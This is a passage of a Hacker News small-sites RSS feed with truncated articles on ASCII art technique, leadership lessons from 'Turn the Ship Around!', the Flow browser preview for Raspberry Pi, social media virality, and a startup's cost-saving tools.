and \ keys. Diagonals with other gradients need a technique similar to
that used to make slight curves. Experiment yourself to see how you
can make different angles. Here are some examples to start you off:

</p><pre>       /         .'               _,-'                            __
      /        .'             _,-'                        __..--''
     /       .'           _,-'                      __..''
    /      .'         _,-'                  __..--''
   /     .'       _,-'              __..--''
  /    .'     _,-'          __..--''                   ____....----"""
 /   .'   _,-'      __..--''           ____....----""""
/  .'  ,-'  __..--''   ____....----""""
</pre>



<h2>Circles</h2>

<p>By now we've looked at the basic characters, character height, slight
curves, lines, and slopes. The last thing to look at is what many
people who make ascii have trouble with: circles. You're half way
there already, though, because ascii circles are basically a mix of
vertical and horizontal lines, slopes or diagonals, and curves. After
a little practice, you'll get a feel for making different sized
circles - I have a basic set of circles in a file that I refer to when
I need a circular or rounded shape in an ascii pic, so now I can make
them easily in all sorts of sizes. Start making small circles - how
many ways can you think of to make a circle in under 5 lines? The
bigger the circle the more rounded it can be, but try making circles
of different sizes and see what you come up with. These are mine:
</p><pre>                                               __
                          _   /""\            /  \
1 line:  O ()   2 lines: (_)  \__/   3 lines: \__/

                                                     ____
           ___               .-''-.                .'    `.
4 lines:  /   \   5 lines:  /      \   6 lines:   /        \
         |     |           |        |             |        |
          \___/             \      /              \        /
                             `-..-'                `.____.'

             _.-""""-._
9 lines:   .'          `.
          /              \
         |                |
         |                |
         |                |
          \              /
           `._        _.'
              `-....-'
</pre>

<p>That's the basic characters, and what you can do with them. Play with
them, see what patterns and ascii scribbles you can make. Have a go at
taking one of my pics, or another ascii pic from some of the excellent
sites around, and copy it. Then change it! See how you can use the
characters to make the picture look different. Can you make the
expression on a face change? Can you make an ascii person fatter,
thinner, taller, shorter? Give Barney the dinosaur a moustache, or,
much better, multiple wounds?  :-) This is how I learned. Many of my
first efforts were absolutely dreadful. So I looked at how someone
else had made the same sort of picture and learned from it. And I
still do - probably why people often say my style is very similar to
Joan Stark's!

</p><p>To get you started, cut and paste this head into wherever you want to
draw your ascii, and give it a face. Add a hat or a body. Or make the
hair shorter or longer. Make it a clown or a devil!

</p><pre>           ,-.,~~.
         ,'///||\\`.
        ///(((||)))\\.
       (((         )))
       _)))        |(_
      ._//\       /\\_.
      `-'_/`-._.-'\-`-'
        ' \/=._.=\/ hjw
</pre>

<h2>Moving Forward</h2>

<p>That's all the boring stuff about technique over. :-) What's coming up
is a step by step demo of how I go about turning a picture into ascii.

</p><p>When you first start, it's always a good idea to try to draw something
simple. Gromit the dog is made up of very simple shapes - just ovals
and circles, so I'll use him as an example.



</p><p>To start a picture, I look for the simplest or most prominent feature
of whatever I'm trying to draw. In Gromit's case, I reckon it's his
nose. :-) I'll try the 2 line circle and see where that takes
me. After I've drawn his nose I'll see if I can draw the shape of his
head around it:
</p><pre>               ___
              /   \
             |     |
            /   _   \
            |  (_)  |
             \     /
              `---'
</pre>

<p>Hmm.. don't like that - the top of his head isn't tall enough, but if
I make it any longer it looks too …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ludd.ltu.se/~vk/pics/ascii/junkyard/techstuff/tutorials/Hayley_Wakenshaw.html">https://www.ludd.ltu.se/~vk/pics/ascii/junkyard/techstuff/tutorials/Hayley_Wakenshaw.html</a></em></p>]]>
            </description>
            <link>https://www.ludd.ltu.se/~vk/pics/ascii/junkyard/techstuff/tutorials/Hayley_Wakenshaw.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568945</guid>
            <pubDate>Tue, 29 Dec 2020 11:58:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reflections on the Lack of Adoption of Domain Specific Languages [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25568703">thread link</a>) | @bnr
<br/>
December 29, 2020 | http://grammarware.net/text/2020/dsl-adoption.pdf | <a href="https://web.archive.org/web/*/http://grammarware.net/text/2020/dsl-adoption.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://grammarware.net/text/2020/dsl-adoption.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568703</guid>
            <pubDate>Tue, 29 Dec 2020 11:11:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Turn the Ship Around]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25568654">thread link</a>) | @ColinWright
<br/>
December 29, 2020 | https://www.annashipman.co.uk/jfdi/turn-the-ship-around.html | <a href="https://web.archive.org/web/*/https://www.annashipman.co.uk/jfdi/turn-the-ship-around.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="turn-the-ship">
    
    <date>26 November 2020</date>
      <p>Prompted by some discussions at work, I recently read <a href="https://uk.bookshop.org/books/turn-the-ship-around-a-true-story-of-building-leaders-by-breaking-the-rules/9780241250945">Turn the Ship Around!</a> I enjoyed it. Here are my notes.</p>

<h2 id="making-followers-into-leaders-in-the-navy">Making followers into leaders in the Navy</h2>

<p>I had previously seen a talk about the concepts by the author, L. David Marquet. Recently, one of my team shared a link to this <a href="https://www.youtube.com/watch?v=OqmdLcyES_Q">short video (10 min)</a> when we were having a discussion about how to take more ownership, and I thought I would read the book to get the practical steps.</p>

<p>The context is fascinating, because being a leader at all levels rather than following orders, is expressly something I do not associate with the military.</p>

<p>The book is essentially a case study of what L. David Marquet and his team aboard a nuclear submarine did to move from a “leader-follower” approach to a “leader-leader” approach.</p>

<p>Each chapter illustrates an idea with an example, which makes it very easy to read, and then supplements it with questions you can use to think about how this idea could work in your own organisation. I always find it much more powerful when a business book is written by someone who actually has the experience of implementing the ideas they write about (like <a href="https://www.annashipman.co.uk/jfdi/high-output-management.html">High Output Management</a>, my favourite).</p>

<h2 id="the-goal-was-leadership-at-all-levels">The goal was leadership at all levels</h2>

<p>The end result was a submarine where each crew member took responsibility for their own area. Instead of the Captain making decisions, crew members would come to him and say “Captain, I intend to…” and he would say “very well”.</p>

<p>And this was just the decisions he needed to know about. 95% of the decisions on board were taken without his input.</p>

<p>The fact that they had leadership at all levels also meant they were more resilient. They had a wide pool of talent. He gives an example of wanting to let two senior people have extended leave for personal reasons at the same time, which he was able to do because there were others able to do those roles.</p>

<h2 id="he-didnt-know-the-ship-so-had-to-be-curious-rather-than-rote-questioning">He didn’t know the ship, so had to be curious (rather than rote questioning)</h2>

<p>He was in an interesting position in that he had trained for a different type of submarine, so when he joined this post he was not as technically competent as he was used to being (and ask the Navy traditionally expect leadership to be).</p>

<p>This meant when he asked the crew questions about the equipment it wasn’t to test them on their knowledge but because he genuinely did not know. Eventually he became fully technically competent on the ship but by then the patterns of interaction had been set.</p>

<p>He talked about his own struggles with wanting to be the smartest person in the room, and I found this very insightful; one of the challenges with a “leader-leader” approach is having to let go of your idea of yourself as someone who has all the answers, and this can be very hard.</p>

<p>I liked this, because it ties into my experience joining as Technical Director of a product that I didn’t build, so could not hope to be anywhere near as technically competent with as the people who built it and work on it every day.</p>

<p>One of the questions he poses at the end of the section on this is “Is technical competence personal or organisational?”</p>

<h2 id="he-met-each-member-of-the-crew-and-asked-them-some-questions">He met each member of the crew and asked them some questions</h2>

<p>One of the first things he did when taking command of the submarine was meet with each crew member and ask them a set of questions very similar to <a href="https://www.annashipman.co.uk/jfdi/meeting-everyone.html">the ones I asked my team when I joined</a>. (One question I might add for next time is “What is the best thing I can do for you?”)</p>

<p>I found that very interesting, because that idea was recommended to me by a previous mentor; he had been recommended it by a mentor of his, who was a Rear Admiral in the Navy, so I wonder if there was a direct connection here!</p>

<h2 id="emancipated-not-empowered">Emancipated, not empowered</h2>

<p>He talks a lot about how “empowerment” doesn’t work. It’s the leader allowing the crew to be empowered; so it’s still “leader-follower”, which drowns out the message. Instead, he talks about “emancipation”.</p>

<p>He says he wanted to make sure his team deliberately decided to take charge. “It wouldn’t be any good if I directed them. You can’t invoke leader-follower rules to direct a shift from leader-follower to leader-leader.”</p>

<p>When it’s going well you no longer have the ability to empower your staff, because they are no longer relying on you for their source of power.</p>

<p>He then defines leadership as communicating people’s worth and potential to people so well they are inspired to see it themselves.</p>

<h2 id="people-need-to-own-the-consequences-of-decisions-they-make">People need to own the consequences of decisions they make</h2>

<p>He started small, with each department head in charge of authorising leave. But then they weren’t in charge of the consequences, e.g. if too many people were on leave at once and there weren’t enough people to cover the watch. So then each department head was in charge of leave and the watch rota; i.e. the consequences of their decisions.</p>

<p>This became: each department head monitors their own departments and are responsible for getting the work done. (This works well when there are clear domains; one challenge we have on our team is that we share responsibility for a large domain rather than being able to split it clearly by area. This is something we’ll have to figure out.)</p>

<p>He requires each department head – and eventually, each crew member –&nbsp;to own both problems and the solutions to them.</p>

<p>Delegating authority in this way means always leaving room to question orders, and also people being able to tell him he is wrong. He recounts a story of when an officer much junior to him tells him, in response to an order, “No, Captain, you’re wrong.” The junior officer was correct, and had they instead followed the Captain’s orders, they would not have achieved their mission.</p>

<h2 id="i-intend-to">I intend to…</h2>

<p>Initially, they would come to him and say “I intend to…” and he would ask questions, for example, have you considered this safety aspect. Then he started asking them what he was thinking. Ultimately, instead of him asking questions, his crew would give enough information so that he just needs to assent.</p>

<p>In order to do this, you need to think like your boss to understand what questions they may have. He says on his submarine, they had no need of leadership development programmes – the way they ran the ship <em>was</em> a leadership development programme.</p>

<p>While reading this I wondered how we could apply it. My <a href="https://www.annashipman.co.uk/jfdi/delegating-to-a-team.html">aim is to have the principal engineers on my team running the team without me</a>, so something like this would be good. One of the challenges is that the tasks are much larger or longer-lived: it’s not “I intend to submerge the ship”, it’s more like “I intend to spend three weeks working on a proposal for how to make our content stores more consistent and cost-effective” and so would have to involve information about why that was a priority compared to other tasks.</p>

<p>It also made me think about the importance of clarity around what done looks like. In the first case, ‘done’ is the ship is safely suberged. What is ‘done’ in the second case? A case study? A recommendation? The actual work – consistency among our content stores?</p>

<p>However we do it, this proactive communication is really valuable. Rather than the leader holding all the threads and chasing for updates, each person owns the thread and proactively communicates the progress and goals.</p>



<p>He suggests thinking specifically about what mechanisms/processes can be changed to delegate authority further. What information, context, understanding, tools do people at each level need in order to have authority?</p>

<p>He describes an exercise. Identify where excellence is created in your company, e.g. at interfaces with the customer. Figure out what decisions the people at that interface need in order to achieve excellence. Finally, understand what it would take to get those employees to be able to take those decisions. Generally, this will be technical competence, thorough understanding of the organisation’s goals, authority, and responsibility for the consequences of the decisions made.</p>

<p>I like the idea of asking people, what would you need in order to be able to make this decision rather than passing it up the chain? And then figuring out what we can change so that they have that.</p>

<p>He also asks you to think about: what do I, as a proponent of the leader-leader approach need to delegate to show I am willing to walk the talk? Good question. It reminds me of some excellent advice I got years ago on first taking on a leadership role: “Delegate everything. Far more than feels comfortable.”</p>

<h2 id="as-authority-is-delegated-learning-at-all-levels-becomes-more-important">As authority is delegated, learning at all levels becomes more important</h2>

<p>If people need to make their own decisions, they need to be technically competent in their area.</p>

<p>They created a creed –&nbsp;ultimately, it was about learning (not ‘training’, they felt that was too passive).</p>

<p>I loved this bit of their creed: <em>“Our vision of our command is a learning and competence factory. The raw materials are the new personnel reporting aboard each week, new equipment, and tactics. The product is well-qualified, experienced sailors who, upon detaching from the command, carry their competence throughout the Navy. Each of you, then, is both a product of the factory (when you learn) and a machine in the factory (when you help others learn).”</em></p>

<p>It is about learning while doing. “Instead of looking at a task as just a chore, look at it as an opportunity to learn more about the associated piece of equipment, the procedure, or if nothing else, about how to delegate or accomplish tasks.”</p>

<p>Finally, to each crew member’s question, ‘what do you expect me to do?’: “I expect you to be a better submariner each day.”</p>

<h2 id="this-revolutionised-how-they-thought-about-training-programmes">This revolutionised how they thought about training programmes</h2>

<p>Rather than passive absorbing of information, their training programme was actually an enabler that allowed them to pass decision-making authority to lower and lower levels.</p>

<p>His suggestion about how to apply this in your own organisation is to think about the sentence completion “Our company would be more effective if [level] management could make decisions about [subject].” …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.annashipman.co.uk/jfdi/turn-the-ship-around.html">https://www.annashipman.co.uk/jfdi/turn-the-ship-around.html</a></em></p>]]>
            </description>
            <link>https://www.annashipman.co.uk/jfdi/turn-the-ship-around.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568654</guid>
            <pubDate>Tue, 29 Dec 2020 10:59:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Flow Browser Preview on the Raspberry Pi 400]]>
            </title>
            <description>
<![CDATA[
Score 156 | Comments 61 (<a href="https://news.ycombinator.com/item?id=25568650">thread link</a>) | @hotpoodle
<br/>
December 29, 2020 | https://www.ekioh.com/blog/flow-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://www.ekioh.com/blog/flow-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4917" role="article" itemscope="" itemtype="http://schema.org/BlogPosting">
						
	<header>	
		
		
	    </header> <!-- end article header -->
					
    <section itemprop="articleBody">
				<p>We’re very excited to be making a <a href="https://support.ekioh.com/download/">Flow preview</a> available for public download for the first time. Flow has a fast, modern, architecture that doesn’t share its layout engine with any other browser. While able to render most websites well, many perfectly, Flow still has some way to go. Each month more pages work, as more JavaScript APIs are added or additional CSS functionality created.</p>
<p><a href="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot.png"><img src="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1024x576.png" alt="Flow running on a Raspberry Pi 400" width="1024" height="576" srcset="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1024x576.png 1024w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-300x169.png 300w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-768x432.png 768w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1536x864.png 1536w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot.png 1920w" sizes="(max-width: 1024px) 100vw, 1024px"></a></p>
<p><span id="more-4917"></span>We have chosen to release on just one platform initially, and there are a couple of reasons why. The Raspberry Pi’s hardware is largely fixed – you can’t swap the CPU or GPU. Variations in hardware could cause us to get distracted by issues that really shouldn’t be a priority right now.</p>
<p>Secondly, the Raspberry Pi 400 has very similar performance to many set-top box chips, so a release that demonstrates Flow’s animation performance on embedded hardware is more useful than on a PC where all browsers can easily get 60fps.</p>
<p>It’s been a year since our <a href="https://www.ekioh.com/devblog/full-google-mail-in-a-clean-room-browser/">Google Mail</a> blog post was picked up on <a href="https://twitter.com/FlowBrowser/status/1200070712121348096" data-wplink-edit="true">Twitter</a> and <a href="https://news.ycombinator.com/">Hacker News</a>. Our unexpected sudden fame meant we weren’t prepared for a public browser release, and expectations were (and probably still are) unrealistically high. Most of the HTML user interfaces that we had tried rendered well, and Flow regularly outperformed other browsers on set-top boxes. But, websites never looked quite right.</p>
<p>Last September, we detailed <a href="https://www.ekioh.com/devblog/can-we-fix-it/">our work</a> on tracking down and fixing the rendering of various major websites. No one bug was particularly tricky to fix once we had narrowed it down, but the end result made the browser engine feel much more like an actual browser.</p>
<p>In the meantime, some previously working sites have stopped working due to improvements in their content, for instance, Amazon now requires Web Cryptography to log in. This is a feature currently in progress.</p>
<p>This preview has many features missing that you would reasonably expect from a browser. Media source extensions, cryptography, and CSS Grid are being actively worked on. We have plenty more to get on with, including a UI, accessibility, and better text editing functionality.</p>
<p>We generally know which sites work and which don’t, but prioritise our commercial customers. Bug fixes that impact them usually fix websites, just not necessarily your favourite website. If you are able to help us track down why a particular website (or library) fails to work, we would be very appreciative of a small test case demonstrating the bug. The more simple the test case is, the more likely we are to fix the bug. We will read all emails but, sadly, may not be able to reply.</p>
<p>And finally, while the preview is for the Raspberry Pi 400, it also works on the Raspberry Pi 4. Previous models use a different GPU with different GPU drivers, so we are holding off releasing for those until we have optimised the graphics support.</p>
<p>We hope this preview demonstrates where we are with a brand new browser engine. The feedback we get for this public preview will directly affect the prospects for desktop platforms. Enjoy it, be critical, but please don’t expect Flow to be usable on your favourite websites right now.</p>
<hr>
<p>If you’d like to automatically receive our posts by email please&nbsp;<a href="https://www.ekioh.com/blogregister/">join our mailing list</a>.</p>
<!-- AddThis Advanced Settings above via filter on the_content --><!-- AddThis Advanced Settings below via filter on the_content --><!-- AddThis Advanced Settings generic via filter on the_content --><!-- AddThis Share Buttons above via filter on the_content --><!-- AddThis Share Buttons below via filter on the_content --><!-- AddThis Share Buttons generic via filter on the_content -->	</section> <!-- end article section -->
						
	 <!-- end article footer -->
						
	
<!-- #comments -->	
													
</article></div>]]>
            </description>
            <link>https://www.ekioh.com/blog/flow-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568650</guid>
            <pubDate>Tue, 29 Dec 2020 10:58:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virality and Chaos]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25568353">thread link</a>) | @6AA4FD
<br/>
December 29, 2020 | https://blog.6aa4fd.com/post/virality/ | <a href="https://web.archive.org/web/*/https://blog.6aa4fd.com/post/virality/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>This paper discusses virality in the context of social media,
a feature characteristic of some of the ways it departs from earlier mass media institutions like television.
I begin by explaining why chaos alone is an insufficient concept for wrangling this state of affairs
then proceed with a more systematic and detailed view of how viral phenomena occur
as manifestations of the rapidly adapting architecture of social media platforms.
Then I discuss why this state of affairs can also not be equated with democracy,
and conclude with a brief summary of the paper.</p>
<p>While I refer to concepts hailing from philosophy’s ivory tower,
nothing in this paper should prove inaccessible to a lay reader
and I hope that anyone interested in this phenomenon
will read on, regardless of their background.</p>
<h2 id="chaos"><del>Chaos</del></h2>
<p>It is tempting to describe the sudden viral popularity
of people and media on social media platforms
as chaotic,
because it is visible in a manner both dramatic and sudden.
Over a month, a video game skyrockets in popularity,
or a video released by someone with no following on YouTube
reaches ten million views,
all with no clear reason.
Chaos might come to mind because there appears to be no rule or system
we can use to explain how it happened,
or to predict the next occurrence.</p>
<p>The troublesome thing about chaos, as Gilles Châtelet predicted, is that it disperses
into rules, chances, systems, and organizations,
like a radioactive material undergoes a half life.
In the case of the modern web, this activity of making rules out of chaos
is already done professionally under job titles like search engine optimization.</p>
<p>It is misleading to characterize virality in terms of chaos because,
much to the dismay of SEO practitioners,
the rules, the relationships between causes and effects, are constantly changing.
Finding a relationship between the phase of an element and its environment
is all well and good when that relationship is fixed,
producing consistent results to be narrowed down and induced as the evidence grows,
but when there is no consistent relationship to be found,
a trend line becomes a trend smear.</p>
<p>What Châtelet predicted for chaos was ‘self-regulation’,
a popular laissez-faire attitude of letting things fall where they may,
letting a system come about autonomously.
Social media virality is arguably democratic,
but it has never been autonomous.
Its systems have been set out by television and shopping malls,
in the techniques of advertising and mass-media before the current epoch of media.</p>
<h2 id="glass-houses">Glass Houses</h2>
<p>Jean Baudrillard,
inspired by 50s Las Vegas and the shopping malls of the 70s,
understood those spaces as characteristic of mass media and consumer culture:
glowing swirls of stimulation,
fanged vortices hungry for our attention.
In his eyes, the advertising world of postmodernity
hollowed out meaning, communication,
and structure,
pulling everything towards a bright exteriority
to capture the attention of the spectator and induce their consumption.</p>
<p>In the architectural metaphor of Las Vegas Baudrillard shows us the city
being absorbed into a glossy and chitinous exterior through advertising.
However, the shopping mall, the Vegas strip, and the newspaper
all have the feature troubling to advertising,
of having a necessary internal structure.
In more concrete terms, a great investment of money and labor
is needed to produce a shopping mall, a casino, or a stadium.
And like the deceptive chaos of contemporary virality I criticized on
Châtelet’s terms, Baudrillard’s vision
is deceptive because it doesn’t really do justice to the concrete reality of the situation in question.</p>
<p>It’s more sticky than one might think, here’s an example:
a conventional newspaper might recommend movies and music on the basis of critics,
their recommendations gradually becoming more and more valuable
as their readers come to trust them more and more.
Money and time has to be invested in compensating this critic,
opportunities are lost because the critic does not always like the thing it would be very convenient for them to like,
and if they are suddenly fired the next critic will have quite a rough go.
A shopping mall has to be built, leases have to be signed with businesses for a length of time,
and they cannot be easily reconfigured either.</p>
<p>What social media platforms have to offer is a plethora of ‘content’ of every sort, ready made even before
a hefty sum is invested into a future celebrity,
all to be bombarded at any audience at the platform’s earliest convenience.
In the past, the swirl’s pace was practically limited by the need to install new light displays,
replace billboards, and renovate the fountains.
Our digital architecture is akin to a city of electronic billboards,
instantly configurable and rapidly changing,
producing vampiric stimuli only barely beholden to the laws of labor and construction.</p>
<h2 id="testing">Testing</h2>
<p>The new architecture of social media does not even have the chitinous shell of the Vegas strip,
it is becoming more like a dream world,
changing at the speed of thought.
Virality occurs when this dream world tests new content to great success.</p>
<p>Whether due to a change in target demographic,
a theme and aesthetic becoming stale,
or a desire to sell more efficiently,
marketing enterprises have always been innovating.
Innovation is generally brought about by testing,
the combination of a new idea, data collection,
and quantitative analysis of that data,
to see how effective the new approach was.</p>
<p>A clear example of this is A/B testing,
a method whereby users of an online service
are randomly served with different versions of the service,
and their interactions with it are collected and compared (Scott W. H. Young, 2014).
Social media features a multiplicity
of variations,
all ready for testing against any number of users.
Through a hybrid of A/B testing and user-profiling,
viral media is the product of the most successful
testing in social media.</p>
<p>This is because virality is the combination of a person or piece of media
receiving low levels of attention, and then becoming very popular,
is the result of a subtle change in a recommendation algorithm,
search feature, or other method used to deliver potentially attention-grabbing
content to some viewers,
and then to expand and show more and more based on its initial successes.</p>
<h2 id="human-vectors">Human Vectors</h2>
<p>Viral content isn’t just successful because
recommendation algorithms put innovative media in front of a bunch of people,
but because social media accommodates self-directed exploration by bored users,
providing search and filtering tools to allow an interested user to search for new media,
a technologically augmented practice similar to crate digging
that adeptly incorporates user profiling, search ranking, and chance
with the user’s own self-knowledge.
This is easily demonstrable in the case of YouTube,
by making an identical search in two windows, one via an active account attached
on which many videos have been watched, and one
without an account.
The results will differ significantly, and will also shift upon subsequent page loads,
the former showing the adjustments made to search based on your user profile,
the latter showing either A/B testing
or perhaps a more inscrutable system accounting for your presumed disinterest in the first results.</p>
<h2 id="democracy">Democracy?</h2>
<p>As virality characterizes social media’s divergence
from mass media,
seeming to substitute embedded personalities and distribution technologies
for flexible and inventive multiplicity
that varies based on user engagement,
it is tempting to think that virality is democratic.</p>
<p>However, this is not the case.
Democracy is defined by the New Oxford American Dictionary as ‘a system of government by the whole population or all the eligible members of a state, typically through elected representatives.’
While content is certainly often ranked and recommended on social media platforms
according to its popularity,
this is mediated by an opaque set of concerns that vary between between platforms.
A public statement from YouTube in 2012 states that their search ‘now optimized [sic] for time watched.’
The Verge reports numerous other instances of changes in their article ‘The golden age of YouTube is over’,
noting that changes ‘[tipped] the scales in favor of [certain] organizations or creators — big ones, mostly.’
Other algorithms are even more opaque, a testament to how far they are from directly democratic:
Forbes reports ‘Hacking Social Algorithms Is the New Marketing’,
demonstrating through the different strategies employed on every platform
and the degree to which the techniques are employed in concert with advertising
that algorithmic recommendations and user preference are incredibly mediated.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Virality is not evidence of chaos, nor of democracy,
but of highly intentional and adaptive
advertising techniques hungrily seeking out the attention of the spectators.
Viral videos and content are the experiments of social media discovery algorithms
and tools at their most successful, representative
of the contrast between social media and the previous mass media.</p>
<h2 id="references">References</h2>
<pre><code>@article{ab,
	title = {Improving Library User Experience with A/B Testing: Principles and Process},
	author = {Scott W. H. Young},
	date = {2014},
	publisher = {Weave: Journal Of Library User Experience},
}

@misc{noa,
	title = {New Oxford American Dictionary},
	editors = {Angus Stevenson and Christine A. Lindberg},
	date = {2011},
}

@article{yt,
	title = {YouTube search, now optimized for time watched},
	author = {The YouTube Team},
	date = {2012},
	url = {https://blog.youtube/news-and-events/youtube-search-now-optimized-for-time},
}

@article{hac,
	title = {Hacking Social Algorithms Is The New Marketing},
	author = {Matt Maher},
	date = {2020},
	url = {https://www.forbes.com/sites/forbesbusinesscouncil/2020/11/24/hacking-social-algorithms-is-the-new-marketing/?sh=739c322d50d1},
}

@article{adpoc,
	title = {The golden age of YouTube is over},
	author = {Julia Alexander},
	date …</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.6aa4fd.com/post/virality/">https://blog.6aa4fd.com/post/virality/</a></em></p>]]>
            </description>
            <link>https://blog.6aa4fd.com/post/virality/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568353</guid>
            <pubDate>Tue, 29 Dec 2020 10:01:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How My startup saves $100 a month with home-grown solutions]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25568215">thread link</a>) | @ingve
<br/>
December 29, 2020 | https://lunchbag.ca/how-my-startup-saves-100-dollars-a-month-with-home-grown-solutions/ | <a href="https://web.archive.org/web/*/https://lunchbag.ca/how-my-startup-saves-100-dollars-a-month-with-home-grown-solutions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<p><span>
				Written on <time datetime="2019-11-21 05:00:00 +0000 UTC">November 21, 2019</time>
			</span>
		</p>
		

<p>Hi there, my name is Jen and I am building <a href="https://lunchmoney.app/">Lunch Money</a>, a multicurrency personal finance tool for the modern-day spender.</p>

<p>Frugality is in my blood. Early on in life, I learned the value of a dollar from my parents and have been particularly frugal (or money-conscious) since I quit my full-time job 4 years ago.</p>

<p>This has permeated all aspects of my life now, as a self-proclaimed “froodie”– a frugal foodie (sure you can pay top dollar for the best food, but the real gems are when you find unfathomable value for the taste) and as the founder of a budgeting app. So it’s no surprise that in building my app, I found myself evaluating if paying for a service was worth saving the time it would take to just roll my own solution.</p>

<p>I’m a big believer that time is money, so if you value your time at a certain rate, then you can easily figure out if spending 1 to 2 hours engineering your own solution is worth yet another recurring monthly charge for potentially the lifetime of your product. Remember, it all adds up!</p>

<p>I have outlined 3 home-grown solutions which are currently saving me in total over $100 per month and I am confident these solutions can sustain Lunch Money well through the first 1000 users. As volumes increase, I will surely re-evaluate these solutions but until then, here they are!</p>



<h3 id="the-problem-lots-of-repeated-information-in-support-requests">The problem: Lots of repeated information in support requests</h3>

<p>Since launching, I’ve been getting a steady stream of support requests and questions from users. That along with the fact that I was pushing out new features and improvements on the daily means a lot of information I was conveying would quickly be outdated.</p>

<p>I was also noticing a lot of the same questions. While this was a strong indicator that certain parts of the product could be more intuitive or have a walkthrough, I felt it was nearing the time for Lunch Money to have a centralized knowledge base.</p>

<h3 id="the-hunt-for-a-solution">The hunt for a solution</h3>

<p>Something like Discourse would be cool to have eventually if I build a community around Lunch Money, but for now it didn’t make sense. Since our features are still evolving, I didn’t want to worry so much about outdated answers. Also, at $100 per month, the price point is unjustifiable.</p>

<p>I found that knowledge bases are typically a feature as part of a larger set of tools for customer support. The most popular option I could find was Zendesk, whose support docs system is an add-on, so you have to subscribe to a base plan first which in total would cost you at least $10 per month.</p>

<p>I also found other solutions such as Helpscout, offered at $25/month and packed with features, as well as startups using Notion as a knowledge base. Though they lack analytics and the general look and feel of a knowledge base, the price comes in lower at $4 up to $8 per month.</p>

<p>It was looking like it would cost on average about $10/month for a decently-featured hosted version. From afar, it was enticing given that these services were offering beautiful templates that were already fully hooked up and all you had to do was provide the content.</p>

<h3 id="deciding-to-host-my-own">Deciding to host my own</h3>

<p>I realized that all I really needed for my knowledge base was a good-looking template. All the other features that were offered were not so useful to me and would only be distractions (e.g. comments, live chat, etc). I also didn’t want to spend too much time beyond writing content to get this off the ground.</p>

<p>This led me to browsing <a href="https://themeforest.net/">Themeforest</a> for some Jekyll or Hugo themes since I was familiar with these static-site generators and I wasn’t looking for the bloat that came with a Wordpress or Ghost site.</p>

<p><img src="https://lunchbag.ca/uploads/Screenshot%202019-11-20%2018.22.06.png" alt="" title="Lunch Money knowledge base"><span>Lunch Money’s knowledge base, powered by Jekyll (free) template from Themeforest for one-time payment of $49</span></p>

<p>It took me 10 minutes to find a beautiful, simple template that met my basic needs and it costed a one-time fee of $49. So this template would pay for itself after just a couple of months and considering a docs site is something I would want to have for as long as the product is around, this will end up saving me a lot. I bought the template, added some basic content, pushed it to Github and deployed it for free with Netlify.</p>

<h3 id="final-cost-and-savings">Final Cost and Savings</h3>

<p><strong>Set up time cost:</strong> 10 minutes to find the template, 5 minutes to deploy to Github and Netlify (excludes content-writing time)</p>

<p><strong>Paid solutions:</strong></p>

<ul>
<li>Notion offered at $4 - $8 per month</li>
<li>Freshdesk offered at $15/month</li>
<li>Helpscout offered at $25/month</li>
</ul>

<p><strong>Estimated savings:</strong> $15 per month or $180 per year</p>

<p><strong>Cost:</strong> $49</p>

<p><strong>Pays for itself in:</strong> just over 3 months</p>



<p>While researching customer support tools, I noticed they also handle support tickets that come in through email. However, at those price points, I simply couldn’t justify it. I used a service like Freshdesk exclusively at my first start-up and I can’t exactly pinpoint the value it brought from separating support requests from my normal inbox.</p>

<p>Here’s the thing– your first few customers are so important. They will be your champions later on. It’s imperative to give top-notch service from the very beginning. For me, this means support requests have a high priority and deserve to go to my work inbox which I check most frequently. I also don’t want to install yet another app on my phone or have yet another tab always open in Chrome.</p>

<h3 id="setting-up-my-support-email-for-free">Setting up my support email for free</h3>

<p>To allow users to email me at support@lunchmoney.app, I hooked up the domain to Mailgun (free) <a href="https://documentation.mailgun.com/en/latest/quickstart-receiving.html#inbound-routes-and-parsing">to receive emails and route them appropriately to my inbox</a>. This initially saved me the $6 it would cost to get on GSuite and have Google manage my work domain.</p>

